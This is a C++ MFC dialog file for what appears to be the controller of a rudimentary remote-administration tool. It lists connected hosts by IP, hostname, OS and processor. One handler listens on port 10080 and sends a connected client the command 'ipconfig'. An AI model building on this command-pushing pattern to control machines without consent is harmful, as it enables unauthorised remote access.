
// JinYiGuisDlg.cpp: 实现文件
//
#include "pch.h"
#include "framework.h"
#include "JinYiGuis.h"
#include "JinYiGuisDlg.h"
#include "afxdialogex.h"
#include "linfo.h"
#include "show.h"
#include<WinSock2.h>
#pragma comment(lib,"ws2_32.lib")

#ifdef _DEBUG
#define new DEBUG_NEW
#endif


// 用于应用程序“关于”菜单项的 CAboutDlg 对话框

class CAboutDlg : public CDialogEx
{
public:
	CAboutDlg();

// 对话框数据
#ifdef AFX_DESIGN_TIME
	enum { IDD = IDD_ABOUTBOX };
#endif

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV 支持

// 实现
protected:
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialogEx(IDD_ABOUTBOX)
{
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)
END_MESSAGE_MAP()


// CJinYiGuisDlg 对话框



CJinYiGuisDlg::CJinYiGuisDlg(CWnd* pParent /*=nullptr*/)
	: CDialogEx(IDD_JINYIGUIS_DIALOG, pParent)
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CJinYiGuisDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_LIST1, vlist);
}

BEGIN_MESSAGE_MAP(CJinYiGuisDlg, CDialogEx)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_BN_CLICKED(IDC_BUTTON1, &CJinYiGuisDlg::OnBnClickedButton1)
	ON_BN_CLICKED(IDC_BUTTON2, &CJinYiGuisDlg::OnBnClickedButton2)
END_MESSAGE_MAP()

void CJinYiGuisDlg::initlist()
{
	vlist.InsertColumn(0,TEXT("Ip 地址"), LVCFMT_LEFT, 200);
	vlist.InsertColumn(1,TEXT("端口"), LVCFMT_LEFT, 200);
	vlist.InsertColumn(2,TEXT("主机名"), LVCFMT_LEFT, 200);
	vlist.InsertColumn(3,TEXT("操作系统"), LVCFMT_LEFT, 200);
	vlist.InsertColumn(4,TEXT("端口"), LVCFMT_LEFT, 100);
	vlist.InsertColumn(5,TEXT("处理器类型"), LVCFMT_LEFT, 100);
}
// CJinYiGuisDlg 消息处理程序
void CJinYiGuisDlg::initwinsock()
{
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);
	if (NO_ERROR != WSAStartup(MAKEWORD(2, 2), &wsaData))//初始化Winsock将信息保存在wsaData上 第一个参数指定版本，第二个参数包含了winsock的信息
		exit(1);
	if (2 != LOBYTE(wsaData.wVersion) || 2 != HIBYTE(wsaData.wVersion))
		exit (1);

}
BOOL CJinYiGuisDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();
	this->initlist();
	this->initwinsock();

	// 将“关于...”菜单项添加到系统菜单中。

	// IDM_ABOUTBOX 必须在系统命令范围内。
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);
	if (NO_ERROR != WSAStartup(MAKEWORD(2, 2), &wsaData))//初始化Winsock将信息保存在wsaData上 第一个参数指定版本，第二个参数包含了winsock的信息
		return 1;
	if (2 != LOBYTE(wsaData.wVersion) || 2 != HIBYTE(wsaData.wVersion))
		return 1;


	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != nullptr)
	{
		BOOL bNameValid;
		CString strAboutMenu;
		bNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX);
		ASSERT(bNameValid);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// 设置此对话框的图标。  当应用程序主窗口不是对话框时，框架将自动
	//  执行此操作
	SetIcon(m_hIcon, TRUE);			// 设置大图标
	SetIcon(m_hIcon, FALSE);		// 设置小图标

	// TODO: 在此添加额外的初始化代码

	return TRUE;  // 除非将焦点设置到控件，否则返回 TRUE
}

void CJinYiGuisDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialogEx::OnSysCommand(nID, lParam);
	}
}

// 如果向对话框添加最小化按钮，则需要下面的代码
//  来绘制该图标。  对于使用文档/视图模型的 MFC 应用程序，
//  这将由框架自动完成。

void CJinYiGuisDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // 用于绘制的设备上下文

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// 使图标在工作区矩形中居中
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// 绘制图标
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialogEx::OnPaint();
	}
}

//当用户拖动最小化窗口时系统调用此函数取得光标
//显示。
HCURSOR CJinYiGuisDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}



void CJinYiGuisDlg::OnBnClickedButton1()
{

	// TODO: 在此添加控件通知处理程序代码
	socketserv1 = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	addrServ1 = { 0 };
	addrServ1.sin_family = AF_INET;
	addrServ1.sin_port = htons(10080);
	bind(socketserv1, (SOCKADDR*)&addrServ1, sizeof(addrServ1));
	//socks绑定
	listen(socketserv1, SOMAXCONN);
	 socketClient1 = accept(socketserv1, nullptr, nullptr);
	send(socketClient1, "ipconfig", strlen("ipconfig"), 0);


	//连接至目标端口

	socketclient2 = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	 addrServS2 = { 0 };
	addrServS2.sin_family = AF_INET;
	addrServS2.sin_port = htons(10086);
	addrServS2.sin_addr.S_un.S_addr = inet_addr("127.0.0.1");

	int t = connect(socketclient2, (SOCKADDR*)&addrServS2, sizeof(addrServS2));
	char szBuffer[MAXBYTE] = { 0 };
	recv(socketclient2, szBuffer, MAXBYTE, 0);
	
	CString word(szBuffer);
	MessageBox(word);

	CString tmp =this->trans(socketClient1, socketclient2,"getip");
	CString spl[10];
	split(spl, tmp, 3,';');

	listdeal(spl,3);


	
}


void CJinYiGuisDlg::OnBnClickedButton2()
{
	show tmp;
	tmp.DoModal();
	// TODO: 在此添加控件通知处理程序代码
}
